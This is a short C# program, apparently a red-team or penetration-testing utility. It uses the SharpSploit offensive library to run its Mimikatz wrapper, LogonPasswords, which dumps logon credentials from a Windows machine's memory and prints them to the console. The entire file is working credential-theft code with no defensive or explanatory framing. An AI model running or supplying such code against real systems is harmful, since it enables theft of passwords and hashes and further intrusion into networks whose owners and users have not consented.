using SharpSploit;
using System;

namespace RunMimiClass
 {
 class Program
  {
   static void Main(string[] args)
    {
   
    String output = SharpSploit.Credentials.Mimikatz.LogonPasswords();
    Console.WriteLine(output);
    
    }
   
   }
}
